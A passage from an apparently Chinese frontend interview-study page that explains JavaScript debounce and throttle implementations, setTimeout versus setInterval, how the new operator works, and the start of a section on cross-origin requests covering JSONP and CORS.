  <span class="token keyword">let</span> timer <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> isInvoked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  
  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">if</span> <span class="token punctuation">(</span>immediate <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>isInvoked<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
      isInvoked <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>immediate<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      isInvoked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><h4 id="防抖-使用示例"><a href="#防抖-使用示例" class="header-anchor">#</a> 防抖-使用示例</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> input <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'search-input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> debouncedSearch <span class="token operator">=</span> <span class="token function">debounce</span><span class="token punctuation">(</span>searchAPI<span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

input<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">,</span> debouncedSearch<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">searchAPI</span><span class="token punctuation">(</span><span class="token parameter">query</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'搜索:'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="手写节流"><a href="#手写节流" class="header-anchor">#</a> 手写节流</h3> <p><strong>时间戳版本</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">throttle</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> delay</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> lastTime <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  
  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> now <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">if</span> <span class="token punctuation">(</span>now <span class="token operator">-</span> lastTime <span class="token operator">&gt;=</span> delay<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
      lastTime <span class="token operator">=</span> now<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p><strong>定时器版本</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">throttle</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> delay</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> timer <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  
  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>timer<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
        timer <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p><strong>结合版本（更精确）</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">throttle</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> delay</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> timer <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> lastTime <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  
  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> now <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> remaining <span class="token operator">=</span> delay <span class="token operator">-</span> <span class="token punctuation">(</span>now <span class="token operator">-</span> lastTime<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">if</span> <span class="token punctuation">(</span>remaining <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
      lastTime <span class="token operator">=</span> now<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
        lastTime <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span> remaining<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><h4 id="节流-使用示例"><a href="#节流-使用示例" class="header-anchor">#</a> 节流-使用示例</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> scrollHandler <span class="token operator">=</span> <span class="token function">throttle</span><span class="token punctuation">(</span>handleScroll<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'scroll'</span><span class="token punctuation">,</span> scrollHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">handleScroll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'滚动位置:'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>scrollY<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h3 id="现代api替代方案"><a href="#现代api替代方案" class="header-anchor">#</a> 现代API替代方案</h3> <h4 id="_1-intersectionobserver-替代滚动节流"><a href="#_1-intersectionobserver-替代滚动节流" class="header-anchor">#</a> 1. IntersectionObserver（替代滚动节流）</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> observer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IntersectionObserver</span><span class="token punctuation">(</span><span class="token parameter">entries</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'元素进入视口'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token literal-property property">threshold</span><span class="token operator">:</span> <span class="token number">0.1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

observer<span class="token punctuation">.</span><span class="token function">observe</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.target'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h4 id="_2-abortcontroller-替代防抖取消"><a href="#_2-abortcontroller-替代防抖取消" class="header-anchor">#</a> 2. AbortController（替代防抖取消）</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> controller<span class="token punctuation">;</span>

input<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  controller<span class="token operator">?.</span><span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  controller <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AbortController</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/search?q=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>input<span class="token punctuation">.</span>value<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">signal</span><span class="token operator">:</span> controller<span class="token punctuation">.</span>signal
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token comment">/*...*/</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h2 id="_12-settimeout-和-setinterval-的运行机制"><a href="#_12-settimeout-和-setinterval-的运行机制" class="header-anchor">#</a> 12. setTimeout 和 setInterval 的运行机制</h2> <p>setTimeout() 和 setInterval() 都是属于定时器，同属于 window 方法，所以 this 会指向 window，它们的区别在于 setTimeout 只调用一次，而 setInterval 是重复调用。它们两者都是属于异步机制，属于宏任务，只是在指定的时间里将要执行的内容放到任务队列里。</p> <ul><li>使用 setInterval 会出现两个问题<br>
(1) 某些时间间隔会被跳过<br>
(2) 多个定时器代码的执行之间的间隔可能会比预期的小</li></ul> <h4 id="​​用-settimeout-实现-setinterval-的功能​"><a href="#​​用-settimeout-实现-setinterval-的功能​" class="header-anchor">#</a> ​​用 <code>setTimeout</code> 实现 <code>setInterval</code> 的功能​</h4> <p>代码实现</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">mySetInterval</span><span class="token punctuation">(</span><span class="token parameter">callback<span class="token punctuation">,</span> delay</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> timerId<span class="token punctuation">;</span>

  <span class="token comment">// 定义递归函数</span>
  <span class="token keyword">const</span> <span class="token function-variable function">execute</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 执行回调</span>
    timerId <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>execute<span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 递归调用</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token comment">// 第一次启动</span>
  timerId <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>execute<span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// 返回一个清除定时器的方法</span>
  <span class="token keyword">return</span> <span class="token punctuation">{</span>
    <span class="token function-variable function">clear</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timerId<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p>使用示例</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 定义一个回调函数</span>
<span class="token keyword">function</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;Hello!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// 使用自定义的 mySetInterval</span>
<span class="token keyword">const</span> interval <span class="token operator">=</span> <span class="token function">mySetInterval</span><span class="token punctuation">(</span>sayHello<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 5秒后停止</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  interval<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;Interval stopped!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h4 id="对比-setinterval-和-settimeout-实现​"><a href="#对比-setinterval-和-settimeout-实现​" class="header-anchor">#</a> 对比 setInterval 和 setTimeout 实现​</h4> <table><thead><tr><th style="text-align:center;">​​特性</th> <th style="text-align:center;">setInterval</th> <th style="text-align:center;">setTimeout 递归实现</th></tr></thead> <tbody><tr><td style="text-align:center;">​​执行机制​</td> <td style="text-align:center;">固定间隔执行，可能堆积</td> <td style="text-align:center;">前一次执行完才安排下一次</td></tr> <tr><td style="text-align:center;">​​误差累积​</td> <td style="text-align:center;">可能累积延迟（如回调执行时间较长）</td> <td style="text-align:center;">无累积误差</td></tr> <tr><td style="text-align:center;">​​可控性​</td> <td style="text-align:center;">只能 clearInterval</td> <td style="text-align:center;">可动态调整 delay 或停止</td></tr> <tr><td style="text-align:center;">​​内存泄漏风险​</td> <td style="text-align:center;">不清理会导致持续执行</td> <td style="text-align:center;">可手动清理</td></tr></tbody></table> <h2 id="_13-js-中-new-一个对象会发生什么"><a href="#_13-js-中-new-一个对象会发生什么" class="header-anchor">#</a> 13. JS 中 new 一个对象会发生什么</h2> <p>当执行 <code>const obj = new MyClass()</code> 时，会发生以下过程：</p> <ul><li>3.1 创建一个空对象</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment">// 或更底层：obj = Object.create(MyClass.prototype);</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ul><li>3.2 绑定原型（Prototype Link）</li></ul> <p>将新对象的 <code>__proto__</code>(隐式原型) 指向构造函数的 <code>prototype</code>(显式原型) 属性</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>obj<span class="token punctuation">.</span>__proto__ <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ul><li>3.3 执行构造函数（绑定 this）</li></ul> <p>调用构造函数 <code>MyClass</code>，并将 <code>this</code> 指向新创建的对象：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">MyClass</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 构造函数内部的 this 就是 obj</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ul><li>3.4 处理返回值</li></ul> <p>如果构造函数 <strong>返回一个对象</strong>（如 <code>return { foo: 1 }</code>），则 <strong>new</strong> 的结果是这个对象。</p> <p>如果返回 <strong>非对象值</strong>（如 <code>return 1</code>），则忽略返回值，仍然返回新创建的对象 <strong>obj</strong>。</p> <h4 id="手动实现的-new-操作符逻辑"><a href="#手动实现的-new-操作符逻辑" class="header-anchor">#</a> 手动实现的 new 操作符逻辑</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">myNew</span><span class="token punctuation">(</span><span class="token parameter">constructor<span class="token punctuation">,</span> <span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// 1. 创建空对象并绑定原型</span>
  <span class="token keyword">const</span> obj <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// 2. 执行构造函数（绑定 this）</span>
  <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token function">constructor</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// 3. 处理返回值</span>
  <span class="token keyword">return</span> result <span class="token keyword">instanceof</span> <span class="token class-name">Object</span> <span class="token operator">?</span> result <span class="token operator">:</span> obj<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// 使用示例</span>
<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token function">myNew</span><span class="token punctuation">(</span>MyClass<span class="token punctuation">,</span> arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><div class="custom-block warning"><p class="custom-block-title">WARNING</p> <p>箭头函数不能作为构造函数</p></div> <p>箭头函数没有 this 绑定和 prototype 属性，因此不能 new：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token function-variable function">Foo</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// TypeError: Foo is not a constructor</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="_14-跨域是什么-怎么解决"><a href="#_14-跨域是什么-怎么解决" class="header-anchor">#</a> 14. 跨域是什么，怎么解决</h2> <p>跨域指的是浏览器出于安全考虑的同源策略，当从一个地址向另外一个地址请求资源时，<strong>协议</strong>、<strong>域名</strong>、<strong>端口号</strong>任意一个不同都属于跨域</p> <h3 id="同源策略"><a href="#同源策略" class="header-anchor">#</a> 同源策略</h3> <h4 id="_1-什么是同源策略"><a href="#_1-什么是同源策略" class="header-anchor">#</a> 1. 什么是同源策略</h4> <p>同源策略是浏览器的一个安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。</p> <h4 id="_2-受限制的操作"><a href="#_2-受限制的操作" class="header-anchor">#</a> 2. 受限制的操作</h4> <p>AJAX请求（实际请求能发出，但浏览器会拦截响应）<br>
DOM访问（iframe跨域时）<br>
Cookie/LocalStorage读取<br>
Web Workers部分操作</p> <h3 id="跨域的解决方案"><a href="#跨域的解决方案" class="header-anchor">#</a> 跨域的解决方案</h3> <h4 id="_1、jsonp-json-with-padding-仅限get请求"><a href="#_1、jsonp-json-with-padding-仅限get请求" class="header-anchor">#</a> 1、JSONP(JSON With Padding) (仅限GET请求)</h4> <p><strong>原理​​：利用<code>&lt;script&gt;</code>标签不受同源策略限制的特性</strong></p> <p>JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">handleResponse</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'收到数据:'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
script<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'https://api.example.com/data?callback=handleResponse'</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>服务端需要配合​​：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 返回格式为：handleResponse({...数据...})</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h4 id="_2、cors-全称是-跨域资源共享-cross-origin-resource-sharing"><a href="#_2、cors-全称是-跨域资源共享-cross-origin-resource-sharing" class="header-anchor">#</a> 2、CORS (全称是&quot;跨域资源共享&quot;（Cross-origin resource sharing）)</h4> <p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS" target="_blank" rel="noopener noreferrer">参考：<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h4 id="cors-原理"><a href="#cors-原理" class="header-anchor">#</a> CORS 原理：</h4> <ul><li>通过HTTP头部协商机制，让服务器声明允许哪些外域访问资源</li> <li>浏览器根据响应头决定是否允许前端JavaScript代码访问响应内容</li></ul> <h4 id="cors-预检请求"><a href="#cors-预检请求" class="header-anchor">#</a> CORS 预检请求：</h4> <ul><li>流程​​：
